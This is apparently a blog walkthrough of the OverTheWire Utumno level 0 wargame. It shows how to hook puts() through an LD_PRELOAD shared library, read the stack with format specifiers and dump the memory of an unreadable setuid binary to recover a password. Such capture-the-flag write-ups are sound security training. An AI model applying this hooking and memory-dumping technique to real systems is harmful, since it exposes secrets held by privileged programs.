---
layout: post
title: OverTheWire - Utumno0
---

Site: http://overthewire.org/wargames/utumno/ <br>
Level: 0<br>
Situation: Library Function Hooking<br><br>

We start as we did during the behemoth files. We create a temp directory to store our files. Find out the archtype for file we are running and run the application to see the output.

{% highlight bash %}
utumno0@melinda:~$ mkdir /tmp/ut0
utumno0@melinda:~$ cd /tmp/ut0
{% endhighlight %}

{% highlight bash %}
utumno0@melinda:/tmp/ut0$ file /utumno/utumno0
/utumno/utumno0: setuid executable, regular file, no read permission
{% endhighlight %}

It seems two things are interesting it seems our file failed this is usually caused when we cannot directly read a file. To insure that is the case we look at the file permissions.

{% highlight bash %}
utumno0@melinda:/tmp/ut0$ ls -la /utumno/utumno0
---s--x--- 1 utumno1 utumno0 5810 Nov 14 10:32 /utumno/utumno0
{% endhighlight %}

This is the case lets go ahead and see what happens when we run it.

{% highlight bash %}
utumno0@melinda:/tmp/ut0$ /utumno/utumno0 
Read me! :P
{% endhighlight %}

Apparently this is our challenge. There are a few routes we can go in this challenge however we are going to go with the hooking a library function. To do this we basically are going to create a shared library redefining the puts function to do what we need.

To do this we will first need to find out what the puts function definition is.

{% highlight bash %}
Definition:
int puts(const char *s);

Return:
puts() and fputs() return a non-negative number on success, or EOF on error. 
{% endhighlight %}

So we are going to go ahead and implement a simple hook.

{% highlight c %}
//hookputs.c

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <dlfcn.h>
 
int puts(const char *s) {
    int i;
    char *pt;

    // Variable to store the original puts function. just incase we need it.
    static void* (*my_puts)(const char*s) = NULL;

    if (!my_puts){
        // Store the original puts function.
        my_puts = dlsym(RTLD_NEXT, "puts");
    }
 
    // Display our hooked
    printf("Hooked-%s", s);

    return 0;
 
}
{% endhighlight %}

We need to compile this for the correct archtype which in this case is i386 and we need to link it as well.

{% highlight bash %}
utumno0@melinda:/tmp/ut0$ gcc -m32 -fPIC -c hookputs.c 
utumno0@melinda:/tmp/ut0$ ld -shared -m elf_i386 -o hookputs.so hookputs.o -ldl
{% endhighlight %}

Now in order to load our hook all that is needed is to use LD_PRELOAD to load our shared object. It’s important to note when we use ltrace on the following command it is going to error saying it cannot open utumno0 however our lib is still able to be traced so we can get some trace.

{% highlight bash %}
utumno0@melinda:/tmp/ut0$ LD_PRELOAD="./hookputs.so" ltrace /utumno/utumno0 

ERROR: ld.so: object './hookputs.so' from LD_PRELOAD cannot be preloaded 
(wrong ELF class: ELFCLASS32): ignored.failed to initialize process 15198: 
No such file or directory couldn't open program '/utumno/utumno0': No such file or 
directory
utumno0@melinda:/tmp/ut0$ Hooked-Read me! :P
{% endhighlight %}

It works! Even if it says that our object could not be preloaded it is still loaded interesting. 

So now all that is needed is for us to locate the memory locations holding the "Read me!" information. Since we can't open the application in a debugger due to not having read permissions on the file. We can actually use a printf and the values we used to exploit a format string vulnerability to read the stack.

So to do that we turn our hook to the following.

{% highlight c %}
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <dlfcn.h>
 
int puts(const char *s) {
    int i;
    char *pt;

    // Variable to store the original puts function. just incase we need it.
    static void* (*my_puts)(const char*s) = NULL;

 
    if (!my_puts){
        // Store the original puts function.
        my_puts = dlsym(RTLD_NEXT, "puts");
    }

    // Start looking at stack addresses
    printf("%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-");
    // Display our hooked
    printf("Hooked-%s", s);

    return 0;
 
}

{% endhighlight %}

We recompile and run it and it gives us the following.

{% highlight bash %}
utumno0@melinda:/tmp/ut0$ LD_PRELOAD="./hookputs.so" ltrace /utumno/utumno0 
ERROR: ld.so: object './hookputs.so' from LD_PRELOAD cannot be preloaded 
(wrong ELF class: ELFCLASS32): ignored.
failed to initialize process 17346: No such file or directory
couldn't open program '/utumno/utumno0': No such file or directory
utumno0@melinda:/tmp/ut0$ f7fd527c-ffffd6f4-f7fd5210-1-f7fc8000-ffffd6c8-804841a-
80484cb-ffffd764-ffffd76c-f7e5307d-f7fc83c4-Hooked-Read me! :P
{% endhighlight %}

Looking at these we have a few memory addresses a bit scattered however if we look closely there is two addresses that are very close together. 0x804841a and 0x80484cb so we are going to go ahead and run through this memory space. 

Turning our hooking code to the following.

{% highlight c %}
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <dlfcn.h>
 
int puts(const char *s) {
    int i;
    char *pt;

    // Variable to store the original puts function. just incase we need it.
    static void* (*my_puts)(const char*s) = NULL;
 
    if (!my_puts){
        // Store the original puts function.
        my_puts = dlsym(RTLD_NEXT, "puts");
    }

    // Start looking at stack addresses
    printf("%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-");
    // Display our hooked
    printf("Hooked-%s", s);
    // Run through the memory space.
    for( i = 0x804841a; i < 0x80484cb; i++) {
        pt = i;
        printf("%c", *pt);
        printf("");
    }
    return 0;
}
{% endhighlight %}

After running that our output is the following.

{% highlight bash %}
utumno0@melinda:/tmp/ut0$ LD_PRELOAD="./hookputs.so" ltrace /utumno/utumno0 
ERROR: ld.so: object './hookputs.so' from LD_PRELOAD cannot be preloaded 
(wrong ELF class: ELFCLASS32): ignored.
failed to initialize process 17784: No such file or directory
couldn't open program '/utumno/utumno0': No such file or directory
utumno0@melinda:/tmp/ut0$ f7fd52d8-0-0-ffffd6c8-f7ff0500-ffffd6f4
-f7fd5240-1-f7fc8000-ffffd6c8-804841a-80484cb-Hooked-Read me! :
-- SNIP --
OMMITED NONE ALPHA NUMERIC CHARACTERS 
-- SNIP --
[OMITTED]
{% endhighlight %}

There is our password.